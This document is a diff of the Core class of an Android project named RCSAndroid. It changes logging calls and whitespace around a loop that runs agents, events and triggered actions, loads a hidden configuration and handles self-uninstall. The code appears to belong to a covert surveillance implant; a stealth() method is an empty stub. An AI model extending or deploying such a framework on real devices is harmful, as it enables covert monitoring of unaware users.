@@ -100,27 +100,30 @@ public class Core extends Activity implements Runnable {
 		stealth();
 		try {
 			for (;;) {
-				Log.i(TAG,"init task");
+				Log.d(TAG,"Info: init task");
+				
 				if (taskInit() == false) {
-					Log.e(TAG,"TaskInit() FAILED");
+					Log.d(TAG,"Error: TaskInit() FAILED");
 					break;
 				} else {
 					Log.d(TAG,"TaskInit() OK");
 					// CHECK: Status o init?
 				}
+				
 				Status.self().setRestarting(false);
-				Log.i(TAG,"starting checking actions");
+				Log.d(TAG,"Info: starting checking actions");
+				
 				if (checkActions() == false) {
-					Log.e(TAG,"CheckActions() wants to exit");
+					Log.d(TAG,"Error: CheckActions() wants to exit");
 					// chiudere tutti i thread
 					break;
 				} else {
-					Log.i(TAG,"Waiting a while before reloading");
+					Log.d(TAG,"Info: Waiting a while before reloading");
 					Utils.sleep(2000);
 				}
 			}
 		} catch (final Exception ex) {
-			Log.e(TAG,"run " + ex);
+			Log.d(TAG,"Error: run " + ex);
 		} finally {
 			Log.d(TAG,"RCSAndroid exit ");
 			Utils.sleep(2000);
@@ -145,8 +148,8 @@ public class Core extends Activity implements Runnable {
 				final int[] actionIds = status.getTriggeredActions();
 
 				final int asize = actionIds.length;
+				
 				if (asize > 0) {
-
 					for (int k = 0; k < asize; ++k) {
 						final int actionId = actionIds[k];
 
@@ -154,7 +157,7 @@ public class Core extends Activity implements Runnable {
 						final int exitValue = executeAction(action);
 
 						if (exitValue == 1) {
-							Log.i(TAG,"checkActions: Uninstall");
+							Log.d(TAG,"Info: checkActions: Uninstall");
 							UninstallAction.actualExecute();
 							return false;
 						} else if (exitValue == 2) {
@@ -187,7 +190,7 @@ public class Core extends Activity implements Runnable {
 			final Device device = Device.self();
 
 			if (!loadConf()) {
-				Log.e(TAG,"Cannot load conf");
+				Log.d(TAG,"Error: Cannot load conf");
 				return false;
 			}
 
@@ -203,13 +206,15 @@ public class Core extends Activity implements Runnable {
 				Log.d(TAG,"eventManager FAILED");
 				return false;
 			}
-			Log.i(TAG,"Events started");
+			
+			Log.d(TAG,"Info: Events started");
+			
 			if (agentManager.startAll() == false) {
 				Log.d(TAG,"agentManager FAILED");
 				return false;
 			}
-			Log.i(TAG,"Agents started");
-
+			
+			Log.d(TAG,"Info: Agents started");
 			Log.d("RCS", "Core initialized");
 			return true;
 
@@ -239,14 +244,18 @@ public class Core extends Activity implements Runnable {
 
 		// tries to load the file got from the sync, if any.
 		final AutoFile file = new AutoFile(Path.conf() + Configuration.NEW_CONF);
+	
 		if (file.exists()) {
 			final byte[] resource = file.read(8);
+			
 			// Initialize the configuration object
 			final Configuration conf = new Configuration(resource);
+			
 			// Load the configuration
 			loaded = conf.LoadConfiguration();
 
-			Log.i(TAG,"Conf file loaded: " + loaded);
+			Log.d(TAG,"Info: Conf file loaded: " + loaded);
+			
 			if (!loaded) {
 				file.delete();
 			}
@@ -254,17 +263,17 @@ public class Core extends Activity implements Runnable {
 
 		// tries to load the resource conf
 		if (!loaded) {
-
 			// Open conf from resources and load it into resource
 			final byte[] resource = Utils.InputStreamToBuffer(resources
 					.openRawResource(R.raw.config), 8); // config.bin
 
 			// Initialize the configuration object
 			final Configuration conf = new Configuration(resource);
+			
 			// Load the configuration
 			loaded = conf.LoadConfiguration();
 
-			Log.i(TAG,"Resource file loaded: " + loaded);
+			Log.d(TAG,"Info: Resource file loaded: " + loaded);
 		}
 
 		return loaded;
@@ -275,7 +284,6 @@ public class Core extends Activity implements Runnable {
 	 */
 	private void stealth() {
 		// TODO Auto-generated method stub
-
 	}
 
 	/**
@@ -283,7 +291,6 @@ public class Core extends Activity implements Runnable {
 	 */
 	public void testRun() {
 		try {
-
 			final byte[] resource = Utils.InputStreamToBuffer(resources
 					.openRawResource(R.raw.config), 8); // config.bin
 
@@ -316,6 +323,7 @@ public class Core extends Activity implements Runnable {
 			status.triggerAction(0);
 			final int[] actionIds = status.getTriggeredActions();
 			final int asize = actionIds.length;
+			
 			if (asize > 0) {
 				for (int k = 0; k < asize; ++k) {
 					final int actionId = actionIds[k];
@@ -323,7 +331,7 @@ public class Core extends Activity implements Runnable {
 					final int exitValue = executeAction(action);
 
 					if (exitValue == 1) {
-						// Log.i(TAG,"checkActions: Uninstall");
+						// Log.d(TAG,"Info: checkActions: Uninstall");
 						// UninstallAction.actualExecute();
 						// return false;
 					} else if (exitValue == 2) {
@@ -370,18 +378,18 @@ public class Core extends Activity implements Runnable {
 		// final Vector subActions = action.getSubActionsList();
 		final int ssize = action.getSubActionsNum();
 		Log.d(TAG,"checkActions, " + ssize + " subactions");
+		
 		for (int j = 0; j < ssize; ++j) {
 			try {
 				final SubAction subAction = action.getSubAction(j);
-				Check.asserts(subAction != null,
-						"checkActions: subAction!=null");
+				Check.asserts(subAction != null, "checkActions: subAction!=null");
 				// lastSubAction = subAction.toString();
 
 				/*
 				 * final boolean ret = subAction.execute(action
 				 * .getTriggeringEvent());
 				 */
-				Log.i(TAG,"CheckActions() executing subaction (" + (j + 1)
+				Log.d(TAG,"Info: CheckActions() executing subaction (" + (j + 1)
 						+ "/" + ssize + ") : " + action);
 				// no callingEvent
 				subAction.prepareExecute();
@@ -390,6 +398,7 @@ public class Core extends Activity implements Runnable {
 
 				synchronized (subAction) {
 					Log.d(TAG,"CheckActions() wait");
+					
 					if (!subAction.isFinished()) {
 						// il wait viene chiamato solo se la start non e' gia'
 						// finita
@@ -404,7 +413,9 @@ public class Core extends Activity implements Runnable {
 					actionThread.interrupt();
 					Log.d(TAG,"CheckActions() interrupted thread");
 				}
+				
 				Log.d(TAG,"CheckActions() waited");
+				
 				if (subAction.wantUninstall()) {
 					Log.w(TAG,"CheckActions() uninstalling");
 					exit = 1;
@@ -434,7 +445,7 @@ public class Core extends Activity implements Runnable {
 					continue;
 				}
 			} catch (final Exception ex) {
-				Log.e(TAG,"checkActions for: " + ex);
+				Log.d(TAG,"Error: checkActions for: " + ex);
 			}
 		}
 
